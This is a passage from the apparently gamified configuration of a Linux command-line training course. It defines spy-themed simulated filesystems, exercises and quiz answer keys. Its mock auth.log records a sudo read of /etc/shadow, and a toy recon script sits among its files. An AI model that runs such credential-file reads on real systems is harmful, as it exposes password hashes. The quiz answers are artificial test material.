            prerequisites: ['CLH-005'],
            tier: 'CLI Analyst',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'temp', '.bash_history', '.dead_drop']
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['briefing.txt', 'contacts.txt']
                },
                '/home/operator/intel/briefing.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 142,
                    content: `OPERATION SHADOWSTRIKE
=====================
Objective: Establish secure dead drop system
Target: Enemy communications network
Status: Active
Classification: TOP SECRET//NOFORN

Handler codename: RAVEN
Next contact window: 0300 hours
`
                },
                '/home/operator/intel/contacts.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: `FIELD ASSETS - ENCRYPTED CHANNELS
==================================
Alpha Team (Berlin): 192.168.1.10
Bravo Team (Moscow): 192.168.1.20
Charlie Team (Tehran): 192.168.1.30
`
                },
                '/home/operator/temp': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['data.txt', 'cache.tmp']
                },
                '/home/operator/temp/data.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `INTERCEPTED TRANSMISSION
========================
Timestamp: 2024-01-15 14:32:07 UTC
Source: Unidentified numbers station
Frequency: 4625 kHz (UVB-76 adjacent)
Content: Possible one-time pad cipher
Status: Awaiting cryptanalysis
`
                },
                '/home/operator/temp/cache.tmp': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 64,
                    content: 'DECRYPT_KEY=0x7F3A9B2C\nSESSION_ID=SHADOWSTRIKE-447\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 12,
                    content: ''
                },
                '/home/operator/.dead_drop': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `DEAD DROP PROTOCOL
==================
Location: /operations/classified/
Passphrase: "The owl flies at midnight"
Fallback: Brush pass at coordinates 52.5200N 13.4050E

BURN AFTER READING
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'Create operations directory',
                    hint: 'Try: mkdir operations',
                    check: (cmd, state, output, terminal) => {
                        if (cmd.includes('mkdir') && cmd.includes('operations')) {
                            // Check if directory now exists in terminal fs
                            return true;  // We rely on the command being run
                        }
                        return false;
                    }
                },
                {
                    id: 2,
                    task: 'Create mission.log file',
                    hint: 'Try: touch operations/mission.log',
                    check: (cmd, state) => cmd.includes('touch') && cmd.includes('mission.log')
                },
                {
                    id: 3,
                    task: 'Copy briefing.txt to operations',
                    hint: 'Try: cp intel/briefing.txt operations/',
                    check: (cmd, state) => cmd.includes('cp') && cmd.includes('briefing')
                },
                {
                    id: 4,
                    task: 'Move data.txt to operations as classified.txt',
                    hint: 'Try: mv temp/data.txt operations/classified.txt',
                    check: (cmd, state) => cmd.includes('mv') && (cmd.includes('classified') || cmd.includes('operations'))
                },
                {
                    id: 5,
                    task: 'Remove the temp directory',
                    hint: 'Try: rm -r temp',
                    check: (cmd, state) => cmd.includes('rm') && cmd.includes('temp')
                },
            ],

            // Insight Phase - analysis question after objectives complete
            insightPhase: {
                enabled: true,
                question: "Before you leave, what is the dead drop passphrase?",
                acceptedAnswers: [
                    "the owl flies at midnight",
                    "owl flies at midnight",
                    "the owl flies at midnight.",
                    "\"the owl flies at midnight\""
                ],
                hint: "Check for hidden files in your home directory using ls -la",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Passphrase not recognized. Did you check all files, including hidden ones?",
                correctAnswerMessage: "Passphrase confirmed. Dead drop protocol acknowledged."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-007: Permissions & Access Control
        // Theme: Black site security, access control, lockdown
        // ──────────────────────────────────────────────────────────
        'CLH-007': {
            title: 'Permissions & Access Control',
            description: 'Understand who can do what. Permissions are the first line of defense.',
            prerequisites: ['CLH-006'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['secure', 'public', '.shadow_network']
                },
                '/home/operator/secure': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['secret.txt', 'deploy.sh', 'audit.log', 'config.ini']
                },
                '/home/operator/secure/secret.txt': {
                    type: 'file',
                    perms: '-rw-rw-r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `PROJECT LOOKING GLASS - ENCRYPTION KEYS
========================================
Classification: TOP SECRET//SCI//NOFORN

Temporal Comm Array Key: 0xA7F3B2C9D1E8F456
Dimensional Beacon Key:  0x8B2E4F6A1C3D5789
Emergency Shutdown Auth: 0xDEAD0000BEEF1234

WARNING: Unauthorized access is a federal crime
punishable under 18 U.S.C. 1030
`
                },
                '/home/operator/secure/deploy.sh': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `#!/bin/bash
# BLACKSITE FIRMWARE DEPLOYMENT
# Target: Sublevel 7 monitoring array

echo "Authenticating with DARPA uplink..."
rsync -avz --encrypt ./firmware/ blacksite:/sys/array/
echo "Deployment complete. Wipe local cache."
rm -rf /tmp/firmware_*
`
                },
                '/home/operator/secure/audit.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `2024-01-15 03:00:00 - ARRAY ONLINE - Sublevel 7
2024-01-15 03:01:23 - Biometric auth: OPERATOR-7
2024-01-15 03:05:45 - WARNING: Unauthorized file access attempt
2024-01-15 03:05:46 - Intruder countermeasures ARMED
2024-01-15 03:12:00 - Anomaly detected in sector 4
2024-01-15 03:12:01 - Lockdown protocol STANDBY
`
                },
                '/home/operator/secure/config.ini': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 142,
                    content: `[monitoring_array]
host=blacksite.darpa.mil
port=7777
auth=biometric+keycard

[failsafe]
self_destruct_code=ECHO-SEVEN-NINER
countdown_seconds=300
`
                },
                '/home/operator/public': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['readme.txt']
                },
                '/home/operator/public/readme.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: `FACILITY NOTICE
===============
This terminal is for authorized personnel only.
All activity is monitored and logged.
`
                },
                '/home/operator/.shadow_network': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `SHADOW NETWORK ACCESS POINTS
============================
Node Alpha: 10.13.37.1 (active)
Node Beta:  10.13.37.2 (standby)
Node Gamma: 10.13.37.3 (COMPROMISED - DO NOT USE)

Mesh key rotation: Every 6 hours
Next rotation: 0600 UTC
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'Analyze current permissions',
                    hint: 'Try: ls -la secure/',
                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('-l') && cmd.includes('secure')
                },
                {
                    id: 2,
                    task: 'Restrict secret.txt to 600',
                    hint: 'Try: chmod 600 secure/secret.txt',
                    check: (cmd, state) => cmd.includes('chmod') && cmd.includes('600') && cmd.includes('secret')
                },
                {
                    id: 3,
                    task: 'Make deploy.sh executable (755)',
                    hint: 'Try: chmod 755 secure/deploy.sh',
                    check: (cmd, state) => cmd.includes('chmod') && cmd.includes('755') && cmd.includes('deploy')
                },
                {
                    id: 4,
                    task: 'Verify permission changes',
                    hint: 'Try: ls -la secure/',
                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('-l') && cmd.includes('secure')
                },
                {
                    id: 5,
                    task: 'Audit with stat command',
                    hint: 'Try: stat secure/audit.log',
                    check: (cmd, state) => cmd.includes('stat') && cmd.includes('audit')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "Before leaving the facility, which Shadow Network node is compromised?",
                acceptedAnswers: [
                    "gamma",
                    "node gamma",
                    "gamma node",
                    "10.13.37.3"
                ],
                hint: "Check for hidden files in your home directory - network intel may be stored there.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Node not recognized. Review the shadow network access points.",
                correctAnswerMessage: "Confirmed. Node Gamma flagged as compromised - avoid at all costs."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-008: Shell Scripting
        // Theme: Field operations, dead drops, asset management
        // ──────────────────────────────────────────────────────────
        'CLH-008': {
            title: 'Shell Scripting',
            description: 'Automate your operations. Write scripts that work while you sleep.',
            prerequisites: ['CLH-007'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['scripts', 'data', '.bash_history', '.exfil_protocol']
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['recon.sh', 'backup.sh', 'alert.sh']
                },
                '/home/operator/scripts/recon.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `#!/bin/bash
# INFILTRATION RECON SCRIPT
# Codename: SILENT WITNESS
# Deploy on target to gather intel

echo "=== TARGET SYSTEM RECON ==="
echo "Operative: $(whoami)"
echo "Target ID: $(hostname)"
echo "Position: $(pwd)"
echo "Timestamp: $(date +%Y%m%d-%H%M%S)"
echo ""
echo "Network interfaces:"
ip addr 2>/dev/null || ifconfig
echo "==========================="
echo "Exfiltrating to command..."
`
                },
                '/home/operator/scripts/backup.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `#!/bin/bash
# DEAD DROP BACKUP PROTOCOL
# Creates encrypted backup for handler pickup

DROPSITE="dead_drop_$(date +%Y%m%d_%H%M)"

echo "[*] Initiating dead drop protocol..."
mkdir -p "$DROPSITE"

echo "[*] Packaging intel for exfiltration..."
cp -r data/ "$DROPSITE/" 2>/dev/null

echo "[*] Encrypting package..."
# tar czf - "$DROPSITE" | openssl enc -aes-256-cbc

echo "[+] Dead drop ready at: $DROPSITE"
echo "[!] BURN NOTICE: Delete after handler confirms receipt"
`
                },
                '/home/operator/scripts/alert.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 298,
                    content: `#!/bin/bash
# EMERGENCY BROADCAST SYSTEM
# Triggers network-wide alert to all assets

THREAT_LEVEL="$1"
INTEL="$2"

echo "================================"
echo "[FLASH] PRIORITY ALERT"
echo "[FLASH] Threat Level: $THREAT_LEVEL"
echo "[FLASH] $INTEL"
echo "[FLASH] Timestamp: $(date)"
echo "[FLASH] All assets go to ground"
echo "================================"
`
                },
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['config.txt', 'notes.txt', 'asset_list.txt']
                },
                '/home/operator/data/config.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 142,
                    content: `[command_control]
primary_server=10.0.0.1
backup_server=10.0.0.2
port=4443
protocol=encrypted_mesh

[dead_drop]
rotation_hours=12
max_size_mb=50
`
                },
                '/home/operator/data/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `HANDLER NOTES - EYES ONLY
=========================
Asset MOCKINGBIRD compromised - cut contact
Asset BLUEJAY relocated to safehouse DELTA
Asset RAVEN status: ACTIVE - high value intel incoming

Next check-in window: 0300 UTC
`
                },
                '/home/operator/data/asset_list.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `FIELD ASSETS - CURRENT STATUS
==============================
MOCKINGBIRD - BURNED
BLUEJAY     - RELOCATED
RAVEN       - ACTIVE
SPARROW     - DEEP COVER
PHOENIX     - EXTRACTED
`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 0,
                    content: ''
                },
                '/home/operator/.exfil_protocol': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 198,
                    content: `EMERGENCY EXFILTRATION PROTOCOL
================================
1. Run: ./scripts/backup.sh
2. Signal handler via chalk mark at Site C
3. Leave package at dead drop coordinates:
   40.7484° N, 73.9857° W (under bench)
4. BURN ALL LOCAL COPIES
5. Go dark for 72 hours
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'Examine existing scripts',
                    hint: 'Try: ls scripts/',
                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('scripts')
                },
                {
                    id: 2,
                    task: 'Read the recon script',
                    hint: 'Try: cat scripts/recon.sh',
                    check: (cmd, state) => cmd.includes('cat') && cmd.includes('recon')
                },
                {
                    id: 3,
                    task: 'Execute the recon script',
                    hint: 'Try: bash scripts/recon.sh',
                    check: (cmd, state) => (cmd.includes('bash') || cmd.includes('./')) && cmd.includes('recon')
                },
                {
                    id: 4,
                    task: 'Run the backup script',
                    hint: 'Try: bash scripts/backup.sh',
                    check: (cmd, state) => (cmd.includes('bash') || cmd.includes('./')) && cmd.includes('backup')
                },
                {
                    id: 5,
                    task: 'Verify backup results',
                    hint: 'Try: ls -la',
                    check: (cmd, state) => cmd.includes('ls') && cmd.includes('-l')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "If extraction is required, what are the dead drop coordinates?",
                acceptedAnswers: [
                    "40.7484",
                    "73.9857",
                    "40.7484° n, 73.9857° w",
                    "40.7484 n 73.9857 w",
                    "under bench"
                ],
                hint: "Check for hidden protocol files that detail emergency procedures.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Coordinates not recognized. Review the exfiltration protocol.",
                correctAnswerMessage: "Dead drop coordinates confirmed. Package under bench - handler notified."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-009: Text Processing
        // Theme: Log analysis and data extraction
        // ──────────────────────────────────────────────────────────
        'CLH-009': {
            title: 'Text Processing',
            description: 'Master cut, sort, uniq, awk, and sed. Transform and analyze data streams.',
            prerequisites: ['CLH-008'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'reports', 'logs', 'data', 'scripts', '.bash_history', '.config', '.notes']
                },
                // === INTEL DIRECTORY ===
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['access.log', 'users.db', 'network.log', 'auth.log', 'captured.pcap.txt']
                },
                '/home/operator/intel/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 892,
                    content: `192.168.1.105 - - [15/Jan/2024:10:15:32] "GET /admin/login.php" 200
192.168.1.42 - - [15/Jan/2024:10:16:01] "GET /index.html" 200
10.0.0.88 - - [15/Jan/2024:10:16:45] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:17:22] "GET /admin/config.php" 200
192.168.1.42 - - [15/Jan/2024:10:18:03] "GET /images/logo.png" 200
10.0.0.88 - - [15/Jan/2024:10:18:55] "POST /api/upload" 403
192.168.1.105 - - [15/Jan/2024:10:19:12] "GET /admin/users.php" 200
172.16.0.23 - - [15/Jan/2024:10:20:01] "GET /robots.txt" 200
192.168.1.105 - - [15/Jan/2024:10:21:33] "POST /admin/export" 200
10.0.0.88 - - [15/Jan/2024:10:22:15] "POST /api/upload" 403
192.168.1.42 - - [15/Jan/2024:10:23:44] "GET /contact.html" 200
192.168.1.105 - - [15/Jan/2024:10:24:08] "GET /admin/logs.php" 200`
                },
                '/home/operator/intel/users.db': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `admin:x:1000:1000:System Admin:/home/admin:/bin/bash
jsmith:x:1001:1001:John Smith:/home/jsmith:/bin/bash
operator:x:1002:1002:Field Operator:/home/operator:/bin/bash
analyst:x:1003:1003:Data Analyst:/home/analyst:/bin/bash
guest:x:1004:1004:Guest User:/home/guest:/bin/false
backup:x:1005:1005:Backup Service:/var/backup:/bin/false
monitor:x:1006:1006:Monitor Daemon:/var/monitor:/bin/false`
                },
                '/home/operator/intel/network.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 298,
                    content: `TCP 192.168.1.105:44821 -> 10.0.0.5:443 ESTABLISHED
TCP 192.168.1.42:55123 -> 10.0.0.5:80 ESTABLISHED
UDP 10.0.0.88:53421 -> 8.8.8.8:53 DNS_QUERY
TCP 192.168.1.105:44822 -> 10.0.0.5:22 ESTABLISHED
TCP 172.16.0.23:61234 -> 10.0.0.5:80 TIME_WAIT
TCP 10.0.0.88:48372 -> 10.0.0.5:443 SYN_SENT
TCP 10.0.0.88:48373 -> 10.0.0.5:443 SYN_SENT
UDP 192.168.1.105:55000 -> 10.0.0.1:53 DNS_QUERY`
                },
                '/home/operator/intel/auth.log': {
                    type: 'file',
                    perms: '-rw-r-----',
                    owner: 'root',
                    group: 'adm',
                    size: 1024,
                    content: `Jan 15 09:45:12 shadow sshd[2341]: Accepted publickey for operator from 192.168.1.105 port 52413
Jan 15 09:52:33 shadow sshd[2456]: Failed password for admin from 10.0.0.88 port 44123
Jan 15 09:52:35 shadow sshd[2456]: Failed password for admin from 10.0.0.88 port 44123
Jan 15 09:52:38 shadow sshd[2456]: Failed password for admin from 10.0.0.88 port 44123
Jan 15 09:52:41 shadow sshd[2456]: Connection closed by 10.0.0.88 port 44123 [preauth]
Jan 15 10:01:22 shadow sudo: operator : TTY=pts/0 ; PWD=/home/operator ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jan 15 10:15:00 shadow sshd[2512]: Accepted password for jsmith from 192.168.1.42 port 55612
Jan 15 10:22:18 shadow sshd[2534]: Invalid user scanner from 10.0.0.88 port 44200
Jan 15 10:22:19 shadow sshd[2534]: Failed password for invalid user scanner from 10.0.0.88 port 44200`
                },
                '/home/operator/intel/captured.pcap.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 645,
                    content: `# Packet capture summary - extracted from wireshark
# Source: 10.0.0.88 (Threat Actor)
Frame 1: 10.0.0.88 -> 10.0.0.5 TCP SYN port 443
Frame 2: 10.0.0.5 -> 10.0.0.88 TCP SYN-ACK
Frame 3: 10.0.0.88 -> 10.0.0.5 TCP ACK
Frame 4: 10.0.0.88 -> 10.0.0.5 HTTP POST /api/upload
Frame 5: 10.0.0.5 -> 10.0.0.88 HTTP 403 Forbidden
Frame 6: 10.0.0.88 -> 10.0.0.5 TCP FIN
# Pattern: Automated upload attempts every 2 minutes
# Recommendation: Block 10.0.0.88 at firewall`
                },
                // === LOGS DIRECTORY ===
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['app.log', 'error.log', 'cron.log', 'firewall.log']
                },
                '/home/operator/logs/app.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `2024-01-15 10:00:01 INFO  Application started
2024-01-15 10:00:02 INFO  Database connection established
2024-01-15 10:15:32 INFO  User login: admin from 192.168.1.105
2024-01-15 10:16:45 WARN  Upload rejected: unauthorized IP 10.0.0.88
2024-01-15 10:18:55 WARN  Upload rejected: unauthorized IP 10.0.0.88
2024-01-15 10:20:01 INFO  Robots.txt served to 172.16.0.23
2024-01-15 10:22:15 WARN  Upload rejected: unauthorized IP 10.0.0.88
2024-01-15 10:30:00 INFO  Scheduled backup started
2024-01-15 10:30:45 INFO  Backup completed: 2.3GB`
                },
                '/home/operator/logs/error.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `[ERROR] 2024-01-15 10:16:45 - AuthModule: IP not in whitelist: 10.0.0.88
[ERROR] 2024-01-15 10:18:55 - AuthModule: IP not in whitelist: 10.0.0.88
[ERROR] 2024-01-15 10:22:15 - AuthModule: IP not in whitelist: 10.0.0.88
[ERROR] 2024-01-15 10:25:33 - DBModule: Query timeout after 30s
[WARN]  2024-01-15 10:26:00 - DBModule: Reconnecting to database
[ERROR] 2024-01-15 10:45:12 - FileModule: Disk space below 10%`
                },
                '/home/operator/logs/cron.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Jan 15 00:00:01 CRON[1001]: (root) CMD (/usr/bin/log-rotate)
Jan 15 00:05:00 CRON[1023]: (backup) CMD (/opt/backup/daily.sh)
Jan 15 06:00:00 CRON[1156]: (root) CMD (/usr/bin/apt-daily)
Jan 15 10:30:00 CRON[1289]: (operator) CMD (/home/operator/scripts/monitor.sh)`
                },
                '/home/operator/logs/firewall.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 720,
                    content: `Jan 15 10:16:44 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=22
Jan 15 10:18:54 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=22
Jan 15 10:22:14 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=22
Jan 15 10:25:00 ALLOW IN=eth0 SRC=192.168.1.105 DST=10.0.0.5 PROTO=TCP DPT=443
Jan 15 10:26:12 ALLOW IN=eth0 SRC=192.168.1.42 DST=10.0.0.5 PROTO=TCP DPT=80
Jan 15 10:30:00 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=3306
Jan 15 10:45:00 BLOCK IN=eth0 SRC=10.0.0.88 DST=10.0.0.5 PROTO=TCP DPT=5432`
                },
                // === DATA DIRECTORY ===
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['employees.csv', 'servers.csv', 'ports.txt', 'ips_whitelist.txt']
                },
                '/home/operator/data/employees.csv': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 320,
                    content: `id,name,department,clearance,email
1001,John Smith,Engineering,3,jsmith@shadow.local
1002,Sarah Chen,Security,5,schen@shadow.local
1003,Mike Johnson,Operations,2,mjohnson@shadow.local
1004,Emily Brown,Research,4,ebrown@shadow.local
1005,David Wilson,IT,3,dwilson@shadow.local
1006,Lisa Anderson,Admin,1,landerson@shadow.local`
                },
                '/home/operator/data/servers.csv': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 280,
                    content: `hostname,ip,role,status,os
web01,10.0.0.5,webserver,active,ubuntu
db01,10.0.0.10,database,active,debian
app01,10.0.0.15,application,active,centos
backup01,10.0.0.20,backup,active,ubuntu
monitor01,10.0.0.25,monitoring,maintenance,debian`
                },
                '/home/operator/data/ports.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `22 SSH
80 HTTP
443 HTTPS
3306 MySQL
5432 PostgreSQL
6379 Redis
8080 HTTP-Alt
27017 MongoDB`
                },
                '/home/operator/data/ips_whitelist.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 120,
                    content: `# Authorized IPs
192.168.1.0/24  # Internal network
172.16.0.0/16   # VPN range
10.0.0.1        # Gateway
# NOTE: 10.0.0.88 is NOT authorized`
                },
                // === SCRIPTS DIRECTORY ===
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['monitor.sh', 'analyze_logs.sh', 'extract_ips.sh']
                },
                '/home/operator/scripts/monitor.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `#!/bin/bash
# System monitoring script
echo "=== System Status ==="
uptime
echo ""
echo "=== Disk Usage ==="
df -h
echo ""
echo "=== Active Connections ==="
netstat -tulpn | head -10`
                },
                '/home/operator/scripts/analyze_logs.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `#!/bin/bash
# Log analysis script
# Usage: ./analyze_logs.sh <logfile>

LOGFILE=\${1:-intel/access.log}

echo "=== Top 5 IPs by Request Count ==="
cut -d ' ' -f 1 "$LOGFILE" | sort | uniq -c | sort -rn | head -5

echo ""
echo "=== HTTP Status Codes ==="
awk '{print $9}' "$LOGFILE" | sort | uniq -c | sort -rn`
                },
                '/home/operator/scripts/extract_ips.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `#!/bin/bash
# Extract unique IPs from a log file
# Usage: ./extract_ips.sh <logfile>

grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' "\${1:-/dev/stdin}" | sort -u`
                },
                // === REPORTS DIRECTORY ===
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt', 'threat_brief.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `# Analysis Reports Directory
Save your processed output here.

Example:
  cut -d ' ' -f 1 intel/access.log | sort | uniq -c > reports/ip_counts.txt`
                },
                '/home/operator/reports/threat_brief.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 420,
                    content: `THREAT INTELLIGENCE BRIEF
Date: 2024-01-15
Classification: INTERNAL

SUMMARY:
Suspicious activity detected from external IP.
Multiple unauthorized access attempts to /api/upload endpoint.

ACTION ITEMS:
[ ] Identify threat actor IP using log analysis
[ ] Correlate with auth.log for SSH attempts
[ ] Check firewall logs for blocked connections
[ ] Generate report of all 403 responses`
                },
                // === HIDDEN CONFIG ===
                '/home/operator/.config': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['aliases.conf', 'tools.conf']
                },
                '/home/operator/.config/aliases.conf': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 180,
                    content: `# Custom aliases
alias ll='ls -la'
alias grep='grep --color=auto'
alias ipcount='cut -d " " -f 1 | sort | uniq -c | sort -rn'
alias top10='head -10'`
                },
                '/home/operator/.config/tools.conf': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 120,
                    content: `# Tool configurations
EDITOR=vim
PAGER=less
LOG_DIR=/home/operator/logs
REPORT_DIR=/home/operator/reports`
                },
                // === HIDDEN NOTES ===
                '/home/operator/.notes': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 280,
                    content: `Personal investigation notes:

That IP 10.0.0.88 keeps hitting us. Three failed SSH logins,
then switched to the API. Classic pivot behavior.

Check patterns:
- grep "10.0.0.88" intel/*.log
- cut + sort + uniq to see frequency

This might be automated. Check timing intervals.`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `ls -la
cd intel
cat access.log
grep 403 access.log
cut -d ' ' -f 1 access.log | sort | uniq -c
cat ../reports/threat_brief.txt
ls -la /home/operator/.config/`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'EXTRACT: Cut IP Addresses',
                    hint: 'Use cut to extract IPs: cut -d \' \' -f 1 intel/access.log',
                    check: (cmd, state, output) => cmd.includes('cut') && cmd.includes('-d') && cmd.includes('-f') &&
                               (cmd.includes('1') || cmd.includes('access')) &&
                               output && !output.startsWith('cut:')
                },
                {
                    id: 2,
                    task: 'ORGANIZE: Sort the Log Entries',
                    hint: 'Sort the log: sort intel/access.log',
                    check: (cmd, state, output) => cmd.includes('sort') && cmd.includes('access') &&
                               output && !output.startsWith('sort:')
                },
                {
                    id: 3,
                    task: 'ANALYZE: Count Unique IPs',
                    hint: 'Pipe commands: cut -d \' \' -f 1 intel/access.log | sort | uniq -c',
                    check: (cmd, state, output) => cmd.includes('uniq') && (cmd.includes('-c') || cmd.includes('sort')) &&
                               output && !output.startsWith('uniq:')
                },
                {
                    id: 4,
